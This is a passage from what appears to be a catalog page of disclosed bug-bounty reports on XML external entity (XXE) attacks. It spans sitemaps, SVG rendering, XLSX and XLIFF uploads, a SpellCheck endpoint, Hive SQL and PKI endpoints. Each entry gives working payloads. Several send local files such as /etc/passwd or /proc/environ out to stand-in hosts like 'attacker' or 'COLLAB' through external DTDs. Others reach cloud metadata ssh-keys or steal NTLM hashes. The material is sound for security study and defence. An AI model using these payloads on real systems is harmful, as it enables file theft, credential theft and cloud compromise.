+<h4>Method</h4><ol><li>Create a project pointing crawl source to your sitemap URL.</li><li>Serve a sitemap.xml that declares a %goodies entity (file:///etc/hostname or file:///home/) and pulls an external combine.dtd.</li><li>combine.dtd wraps %goodies into &amp;xxe; which is exfiltrated in a &lt;loc&gt; URL back to your server.</li><li>Point file:// at a directory (file:///home/) to leak directory listings.</li></ol>
+<div class="pre">&lt;!-- sitemap.xml --&gt;
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE urlset [
+ &lt;!ENTITY % goodies SYSTEM "file:///etc/hostname"&gt;
+ &lt;!ENTITY % dtd SYSTEM "http://attacker/combine.dtd"&gt;
+%dtd;
+]&gt;
+&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;
+ &lt;url&gt;&lt;loc&gt;http://attacker/resp/&amp;xxe;&lt;/loc&gt;&lt;/url&gt;
+&lt;/urlset&gt;
+
+&lt;!-- combine.dtd --&gt;
+&lt;!ENTITY xxe "%goodies;"&gt;</div>
+<p class="insight"><b>Insight —</b> Any feature that ingests a user-controlled sitemap.xml or a robots.txt `sitemap:` directive (site audits, SEO tools, search-index crawlers) is an XXE sink. Use file:///dir/ to enumerate directories, then read discovered files. Also seen in Elastic Enterprise Search (#1156748), where the crawler discovered the sitemap via robots.txt and the same external-DTD OOB read applied (limited to single-line files).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/312543" target="_blank" rel="noopener">hackerone.com/reports/312543</a></span><a class="src" href="#report-312543" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-347139" style="--sv:var(--sev-crit)" data-sev="4" data-votes="79" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>LFI+SSRF via XXE/XInclude in ImageMagick SVG-&gt;PNG rendering</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#347139</b> · rockstargames · 1500 USD · 79 votes · resolved</div>
+<div class="taxo"><span>Program <b>rockstargames</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE/XInclude -&gt; LFI (read files) + SSRF (fetch HTTP respo</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The emblem editor converts user-supplied SVG to PNG via a vulnerable ImageMagick; the SVG is parsed with external entities and XInclude enabled, and a regex filter is bypassed with `//` (SMB/UNC) references, allowing arbitrary SVG/XXE loading.</p>
+<h4>Method</h4><ol><li>Bypass the URL regex by referencing external SVG via a double-slash SMB path: url(//attacker.com/malicious.svg#exploit).</li><li>Deliver a classic XXE using an external DTD that reads a local file into an entity rendered as text in the emblem.</li><li>Alternatively use XInclude (xi:include href parse=text) for a more reliable read of files/HTTP responses.</li></ol>
+<div class="pre">&lt;!-- XXE --&gt;
+&lt;!DOCTYPE svg [
+&lt;!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"&gt;
+%outside;
+]&gt;
+&lt;svg&gt;&lt;defs&gt;&lt;pattern id="exploit"&gt;&lt;text x="10" y="10"&gt;&amp;exfil;&lt;/text&gt;&lt;/pattern&gt;&lt;/defs&gt;&lt;/svg&gt;
+
+&lt;!-- exfil.dtd --&gt;
+&lt;!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"&gt;
+&lt;!ENTITY exfil "%data;"&gt;
+
+&lt;!-- XInclude alternative --&gt;
+&lt;text x="10" y="10"&gt;&lt;xi:include href="https://internal/" parse="text"/&gt;&lt;/text&gt;</div>
+<p class="insight"><b>Insight —</b> SVG-&gt;PNG (ImageMagick/librsvg) conversion is a rich XXE/SSRF surface: the rendered output exfiltrates read files. If a regex blocks http(s)://, try `//host/file` (UNC/SMB) to bypass and load external SVG/DTD. XInclude often works where SYSTEM entities are filtered.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/347139" target="_blank" rel="noopener">hackerone.com/reports/347139</a></span><a class="src" href="#report-347139" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-715949" style="--sv:var(--sev-crit)" data-sev="4" data-votes="37" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected full-read XXE in a RapidSpell SpellCheck .aspx endpoint</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#715949</b> · deptofdefense · awarded · 37 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE -&gt; local file read + internal SSRF + NTLM hash theft </b></span></div>
+<h4>Root cause</h4><p style="margin:0">A .NET RapidSpell helper endpoint accepts raw XML with a &lt;textToCheck&gt; field and parses it with external entities enabled; the entity value is reflected back in the response (in-band file read), and on Windows can be pointed at a UNC path to leak NTLM hashes.</p>
+<h4>Method</h4><ol><li>Authenticate and POST text/xml to /Kview/.../RapidSpellHelpFile.aspx.</li><li>Define a SYSTEM entity for a local file and reference it in &lt;textToCheck&gt;.</li><li>The file contents are reflected in the spellcheck response.</li><li>Point the entity at file://attacker-smb/share to capture NTLMv2 hashes; use http:// for internal SSRF.</li></ol>
+<div class="pre">POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
+Content-Type: text/xml; charset=UTF-8
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts"&gt;]&gt;
+&lt;r&gt;&lt;resp&gt;xml&lt;/resp&gt;&lt;textToCheck&gt;&amp;a;&lt;/textToCheck&gt;...&lt;/r&gt;</div>
+<p class="insight"><b>Insight —</b> SpellCheck/RapidSpell/text-processing .aspx endpoints take raw XML and often reflect content in-band -&gt; ideal for reflected XXE. On Windows targets, escalate a file:// XXE to NTLM domain-hash theft via a UNC/SMB path to an attacker host (see mediaservice.net writeup).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/715949" target="_blank" rel="noopener">hackerone.com/reports/715949</a></span><a class="src" href="#report-715949" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-742808" style="--sv:var(--sev-crit)" data-sev="4" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via Apache Hive xpath_string() SQL function -&gt; GCP metadata SSRF</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#742808</b> · evernote · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>evernote</b></span><span>Surface <b>cloud</b></span><span>Chain <b>open Hive -&gt; xpath_string XXE -&gt; SSRF -&gt; GCP metada</b></span><span>Tag <b>cloud-gcp</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An exposed Apache Hive server (port 10000, open to anyone) exposes the xpath_string() SQL function, which parses attacker-supplied XML with external entities; the entity fetches the GCP metadata endpoint, turning the DB into an SSRF to cloud metadata.</p>
+<h4>Method</h4><ol><li>Connect to the open Hive server with a compatible JDBC client version.</li><li>Call xpath_string() on an XML doc whose SYSTEM entity points to metadata.google.internal (v1beta1 needs no header).</li><li>The function returns the metadata value (project-id, then attributes/ssh-keys) directly in the query result.</li></ol>
+<div class="pre">select xpath_string('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"&gt; ]&gt;&lt;stockCheck&gt;&amp;xxe;&lt;/stockCheck&gt;', '*') FROM test LIMIT 5;</div>
+<p class="insight"><b>Insight —</b> XML-processing SQL functions (Hive/Spark xpath, xpath_string, XMLTABLE) are overlooked XXE sinks that return results in-band. From any XXE with outbound access, pivot to cloud metadata: GCP's v1beta1 metadata path (unlike v1) requires no Metadata-Flavor header, so it's reachable via plain XXE -&gt; full cloud-account compromise.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/742808" target="_blank" rel="noopener">hackerone.com/reports/742808</a></span><a class="src" href="#report-742808" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1217114" style="--sv:var(--sev-crit)" data-sev="4" data-votes="16" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Two-stage blind OOB XXE via attacker-hosted S3 XML + external DTD</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1217114</b> · h1-ctf · none · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>blind XXE OOB file read -&gt; discover internal reverse-prox</b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The app fetches an attacker-controlled files.xml from an S3 bucket keyed to the user hash and parses it blindly; a two-stage external-DTD payload with php://filter base64 and a nested parameter entity exfiltrates local files OOB despite no visible output.</p>
+<h4>Method</h4><ol><li>Discover the app reads files.xml from s3://h1-&lt;yourhash&gt;; upload your own files.xml to that bucket.</li><li>files.xml references your external evil.dtd via a parameter entity.</li><li>evil.dtd base64-reads a target file with php://filter and builds a nested entity that requests your Collaborator with the data appended.</li><li>Decode the base64 from your server logs; use it to read nginx config -&gt; find an internal reverse-proxied app -&gt; continue the chain (SQLi via ICMP packet-size exfil).</li></ol>
+<div class="pre">&lt;!-- files.xml --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://attacker-bucket/evil.dtd"&gt; %xxe;]&gt;
+&lt;list&gt;&lt;/list&gt;
+
+&lt;!-- evil.dtd --&gt;
+&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://COLLAB/?x=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;</div>
+<p class="insight"><b>Insight —</b> The canonical OOB blind-XXE recipe: (1) app ingests a remote XML you host = your injection point; (2) external DTD + php://filter base64 lets you read multi-line files that would otherwise break DTD syntax; (3) nested parameter entity (%eval building %exfiltrate) sends the data to Collaborator. Read /etc/nginx config to map internal/reverse-proxied services for the next pivot.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1217114" target="_blank" rel="noopener">hackerone.com/reports/1217114</a></span><a class="src" href="#report-1217114" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-415202" style="--sv:var(--sev-crit)" data-sev="4" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP object injection -&gt; XXE -&gt; php://filter SSRF -&gt; pickle RCE chain</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#415202</b> · h1-5411-ctf · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>path traversal (source read) -&gt; PHP object injection -&gt</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An import endpoint unserializes a base64 blob into a ConfigFile object whose parse() runs XML with libxml_disable_entity_loader(false); reaching it via object injection yields XXE, and php://filter turns the XXE into an SSRF that reads internal HTTP responses, ultimately reaching a pickle-RCE service.</p>
+<h4>Method</h4><ol><li>Read source via a path-traversal in the `template` param (type=text) to find the ConfigFile class and import/export endpoints.</li><li>Craft a serialized array containing a ConfigFile object whose config_raw is an XXE payload; base64 it and POST to import_memes_2.0.php.</li><li>Because http:// entity output failed, wrap it: php://filter/read=convert.base64-encode/resource=http://target -&gt; SSRF that returns response bodies.</li><li>Read /proc/net/tcp to find the internal 127.0.0.1:1337 service, then exploit its base64-pickle status param for RCE.</li></ol>
+<div class="pre">a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:222:"&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://google.com\" &gt;]&gt;
+&lt;payload&gt;&lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;&lt;/payload&gt;";}}</div>
+<p class="insight"><b>Insight —</b> When a disabled entity-loader (libxml_disable_entity_loader(false)) is reachable through PHP object injection, you get XXE for free. If a plain http:// SYSTEM entity produces no output, wrap it in php://filter/convert.base64-encode/resource=http://... to force the response into a base64 entity value -&gt; reliable SSRF that reads internal HTTP responses. Use /proc/net/tcp via XXE/LFI to enumerate listening internal ports.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/415202" target="_blank" rel="noopener">hackerone.com/reports/415202</a></span><a class="src" href="#report-415202" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-486732" style="--sv:var(--sev-high)" data-sev="3" data-votes="159" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind XXE via a remote-XML-fetching URL parameter (patch bypass)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#486732</b> · duckduckgo · none · 159 votes · resolved</div>
+<div class="taxo"><span>Program <b>duckduckgo</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The x.js endpoint fetches and parses an XML document whose URL is supplied in the `u` parameter; the parser still resolves external parameter entities, so a hosted XML that pulls a remote parameter-entity yields blind OOB XXE even after the initial fix.</p>
+<h4>Method</h4><ol><li>Host an XML file that declares an external parameter entity and immediately expands it.</li><li>Point the target at it: /x.js?u=http://attacker/xxe.xml</li><li>Observe the inbound request to attacker for /Blind_xxe, confirming external-entity resolution.</li></ol>
+<div class="pre">&lt;!-- hosted at http://attacker/xxe.xml --&gt;
+&lt;?xml version="1.0" ?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"&gt; %ext;
+]&gt;
+&lt;r&gt;&lt;/r&gt;</div>
+<p class="insight"><b>Insight —</b> Any parameter that makes the server fetch and parse a remote XML/URL (u=, url=, feed=, xml=) is an XXE sink. Always retest a 'fixed' XXE with parameter entities and external DTDs -- fixes that only block direct SYSTEM entities often miss the % param-entity + external DTD path.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/486732" target="_blank" rel="noopener">hackerone.com/reports/486732</a></span><a class="src" href="#report-486732" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-105434" style="--sv:var(--sev-high)" data-sev="3" data-votes="45" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via XLSX (Office Open XML) import -&gt; local file read</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#105434</b> · informatica · none · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span><span>Chain <b>XXE -&gt; arbitrary local file read (extendable to SSRF / OO</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An XLSX import feature parses the embedded XML (xl/worksheets/sheet1.xml) with an XXE-vulnerable parser (external entities enabled), so a malicious spreadsheet reads local files and reflects them into imported cell data.</p>
+<h4>Method</h4><ol><li>Unzip a normal .xlsx and edit xl/worksheets/sheet1.xml to add a DOCTYPE with an external entity</li><li>Reference the entity in a cell value; re-zip as .xlsx</li><li>Upload/import the file into the app; the rendered project shows the file contents (e.g. /etc/passwd)</li></ol>
+<div class="pre">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" &gt;]&gt;
+&lt;!-- reference &amp;xxe; inside a cell value in xl/worksheets/sheet1.xml, then re-zip to .xlsx --&gt;</div>
+<p class="insight"><b>Insight —</b> Any feature ingesting Office formats (xlsx/docx/pptx) or SVG/zip-of-XML is an XXE surface - the XML lives inside the container. Unzip, inject a DOCTYPE with a file:// (or http:// for OOB/SSRF) entity, re-zip, and import. Also applies to blind OOB exfil when output isn't reflected.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/105434" target="_blank" rel="noopener">hackerone.com/reports/105434</a></span><a class="src" href="#report-105434" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-105753" style="--sv:var(--sev-high)" data-sev="3" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OOB XXE file read on XML login endpoint via external parameter-entity DTD</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#105753</b> · informatica · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">POST /ma/api/v2/user/login accepted Content-Type: application/xml and processed DOCTYPE parameter entities including external ones. Chaining a local file parameter entity with a remotely-hosted DTD that wraps it in an FTP request exfiltrates file contents out-of-band (classic OOB XXE), here reading /etc/passwd.</p>
+<h4>Method</h4><ol><li>Find an endpoint accepting application/xml and confirm it processes DOCTYPE/entities</li><li>Define a parameter entity pointing at a local file and another loading an attacker-hosted DTD</li><li>The external DTD builds a nested entity that sends the file contents to an attacker FTP/HTTP listener</li></ol>
+<div class="pre">POST /ma/api/v2/user/login  Content-Type: application/xml
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % b PUBLIC "lol" "file:///etc/passwd"&gt;
+&lt;!ENTITY % asd PUBLIC "lol" "http://ATTACKER/xx.html"&gt;
+%asd;
+%rrr;]&gt;
+&lt;login&gt;&lt;username&gt;demo@informatica.com&lt;/username&gt;&lt;password&gt;Infa123&lt;/password&gt;&lt;/login&gt;
+
+// xx.html (attacker-hosted external DTD):
+&lt;!ENTITY % c "&lt;!ENTITY &amp;#37; rrr SYSTEM 'ftp://ATTACKER/%b;'&gt;"&gt;%c;</div>
+<p class="insight"><b>Insight —</b> Any API accepting application/xml is an XXE candidate even when the body looks like a simple login. Parameter-entity + external-DTD chaining gives OOB exfiltration when the response doesn't reflect the entity, and ftp:// avoids newline/format restrictions of http:// exfil. (This report was mis-CWE'd as resource consumption; it is file-disclosure XXE.)</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/105753" target="_blank" rel="noopener">hackerone.com/reports/105753</a></span><a class="src" href="#report-105753" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2573567" style="--sv:var(--sev-high)" data-sev="3" data-votes="21" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dogtag/RHCS PKI certrequests XXE (CVE-2022-2414)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2573567</b> · deptofdefense · none · 21 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Red Hat Certificate System / Dogtag PKI exposes /ca/rest/certrequests, which parses a posted CertEnrollmentRequest XML with external entities enabled; the entity referenced in &lt;ProfileID&gt; is reflected in the error message (error-based file read). This is CVE-2022-2414.</p>
+<h4>Method</h4><ol><li>POST application/xml to /ca/rest/certrequests with a SYSTEM entity for file:///etc/passwd.</li><li>Reference it in &lt;ProfileID&gt;&amp;ent;&lt;/ProfileID&gt;.</li><li>The 400 error 'Profile &lt;file contents&gt; Not Found' returns the file inline.</li></ol>
+<div class="pre">POST /ca/rest/certrequests HTTP/1.1
+Content-Type: application/xml
+
+&lt;!--?xml version="1.0" ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;CertEnrollmentRequest&gt;
+  &lt;Attributes/&gt;
+  &lt;ProfileID&gt;&amp;ent;&lt;/ProfileID&gt;
+&lt;/CertEnrollmentRequest&gt;</div>
+<p class="insight"><b>Insight —</b> Recognize Red Hat Certificate System / Dogtag PKI (/ca/ee/ca/, /ca/rest/*) and test CVE-2022-2414: ProfileID is an error-based reflected XXE file-read primitive. Any REST endpoint that echoes a parsed field back in an error is an in-band exfil channel.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2573567" target="_blank" rel="noopener">hackerone.com/reports/2573567</a></span><a class="src" href="#report-2573567" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-232614" style="--sv:var(--sev-high)" data-sev="3" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via uploaded XLIFF (.xlf) translation file</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#232614</b> · weblate · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Weblate's translate-toolkit parses uploaded XLIFF (.xlf) translation files as XML with external entities enabled; a user in the Translate group can upload a modified .xlf whose entity reads a local file, which is then displayed back as a translation.</p>
+<h4>Method</h4><ol><li>Download a component's translations as .xlf.</li><li>Insert a DOCTYPE with &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; after the &lt;?xml tag.</li><li>Replace a translation string with &amp;xxe; and re-upload.</li><li>View the translation to see the file contents rendered in the UI.</li></ol>
+<div class="pre">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;!-- then use &amp;xxe; inside a &lt;target&gt;/&lt;source&gt; translation string --&gt;</div>
+<p class="insight"><b>Insight —</b> Translation and localization file formats are XML (XLIFF/.xlf, TMX, .resx, some .po tooling). Upload features for these are XXE sinks, and the imported values are usually reflected back where the translation is shown -&gt; in-band read. Requires only Translator-level privileges.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/232614" target="_blank" rel="noopener">hackerone.com/reports/232614</a></span><a class="src" href="#report-232614" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-416123" style="--sv:var(--sev-high)" data-sev="3" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP object injection -&gt; XXE -&gt; /proc/PID/environ -&gt; token reuse</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#416123</b> · h1-5411-ctf · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>PHP object injection -&gt; XXE local file read -&gt; /proc/e</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A .memepack import deserializes a PHP object whose config_raw is parsed as XML with external entities enabled, giving arbitrary local file read; reading Apache's /proc/&lt;pid&gt;/environ leaks env-var secrets (Papertrail API token, GPG keys) that are then reused against the third-party API.</p>
+<h4>Method</h4><ol><li>Craft a serialized PHP array where element 1 is a ConfigFile object with an XXE payload in config_raw</li><li>Import the .memepack file; the XXE resolves php://filter to base64-read a target file</li><li>Chain file reads: apache2.conf -&gt; envvars -&gt; apache2.pid (PID) -&gt; /proc/&lt;PID&gt;/environ</li><li>Extract PAPERTRAIL_API_TOKEN from environ and reuse it against papertrailapp.com API</li></ol>
+<div class="pre">a:2:{i:0;s:93:"../data/memes/&lt;known&gt;.txt";i:1;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'&gt;]&gt;&lt;meme&gt;&lt;template&gt;&amp;xxe;&lt;/template&gt;&lt;type&gt;TEXT&lt;/type&gt;&lt;/meme&gt;";}}
+# then:
+curl -i -H "X-Papertrail-Token: &lt;TOKEN&gt;" https://papertrailapp.com/api/v1/events/search.json?q=error</div>
+<p class="insight"><b>Insight —</b> When you get arbitrary file read, don't stop at /etc/passwd: walk config -&gt; pidfile -&gt; /proc/&lt;pid&gt;/environ to harvest process environment secrets (API tokens, cloud keys), then pivot by reusing those tokens against the real service. php://filter base64 defeats binary/parse issues.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/416123" target="_blank" rel="noopener">hackerone.com/reports/416123</a></span><a class="src" href="#report-416123" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-106797" style="--sv:var(--sev-high)" data-sev="3" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE by switching Content-Type JSON-&gt;XML on a JSON API + OOB file read</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#106797</b> · informatica · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>api</b></span><span>Chain <b>XXE -&gt; local file read -&gt; OOB exfil (FTP/HTTP) -&gt; i</b></span><span>Tag <b>saml</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A JSON REST endpoint is backed by a marshaller (JAXB) that also accepts application/xml. Re-sending the same request as XML with a DOCTYPE lets external entities be resolved, exposing classic XXE on an API that looked JSON-only.</p>
+<h4>Method</h4><ol><li>Take a working JSON API request, change Content-Type to application/xml and translate the body to equivalent XML</li><li>Add a DOCTYPE with a SYSTEM entity; error messages (JAXBException path) confirm file access</li><li>Escalate to OOB exfiltration with an external DTD / parameter entity to your host</li></ol>
+<div class="pre">POST /api/rest/mpapi/infaMPAPISearchWebService/query
+Content-Type: application/xml;charset=UTF-8
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;params&gt;&lt;queryParams&gt;&lt;query&gt;&amp;xxe;&lt;/query&gt;&lt;/queryParams&gt;&lt;source&gt;marketplace&lt;/source&gt;&lt;rows&gt;5&lt;/rows&gt;&lt;/params&gt;</div>
+<p class="insight"><b>Insight —</b> Always retry JSON/other endpoints as application/xml - many frameworks (JAXB, Jackson XML, .NET) transparently switch marshallers and expose XXE the JSON path hid. Also seen on a YouTrack user-import PUT (#114476) with Java OOB FTP exfil and directory listing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/106797" target="_blank" rel="noopener">hackerone.com/reports/106797</a></span><a class="src" href="#report-106797" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1150799" style="--sv:var(--sev-high)" data-sev="3" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind XML external-entity/include injection detected via OOB collaborator</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1150799</b> · deptofdefense · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>XML injection -&gt; external XSD/XInclude fetch -&gt; blind </b></span></div>
+<h4>Root cause</h4><p style="margin:0">A server-side XML processor accepts attacker XML that references external resources - via xsi:schemaLocation (loads an external XSD) or XInclude href - causing the server to make outbound HTTP/DNS requests to an attacker collaborator (blind SSRF / external service interaction).</p>
+<h4>Method</h4><ol><li>Identify an endpoint/file parameter that parses XML.</li><li>Submit XML with xsi:schemaLocation pointing at http://&lt;collab&gt;/x.xsd, or an XInclude href to the collaborator (URL-encode the payload).</li><li>Wait ~30-60s and observe DNS/HTTP hits on the collaborator confirming server-side XML fetch.</li></ol>
+<div class="pre">&lt;fkp xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://&lt;COLLAB&gt;/fkp.xsd"&gt;fkp&lt;/fkp&gt;
+&lt;!-- XInclude variant (#997381): --&gt;
+&lt;vuc xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include href="http://&lt;COLLAB&gt;/foo"/&gt;&lt;/vuc&gt;</div>
+<p class="insight"><b>Insight —</b> Blind XML injection is confirmable out-of-band even without entity output: xsi:schemaLocation forces an XSD fetch and XInclude forces an href fetch. Always URL-encode, and be patient (schema/DTD fetch can lag). Both are SSRF/external-interaction primitives usable as an attack proxy.</p>
